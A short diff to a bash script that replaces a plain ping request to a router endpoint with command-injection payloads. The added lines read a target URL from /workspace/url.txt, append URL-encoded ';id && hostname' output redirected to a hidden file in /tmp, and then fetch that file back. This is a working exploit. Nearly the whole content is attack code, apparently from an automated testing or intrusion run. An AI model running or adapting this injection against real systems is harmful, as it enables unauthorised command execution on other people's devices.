@@ -1,2 +1,4 @@
 #!/bin/bash
-curl -s http://edge-rt01.branch.pelican-ins.com:8080/ping?host=127.0.0.1
+url=$(cat /workspace/url.txt)
+curl -s "${url};id%20%26%26%20hostname%20%3E%20/tmp/.rex_ci_edge"
+curl -s "${url};cat%20/tmp/.rex_ci_edge"
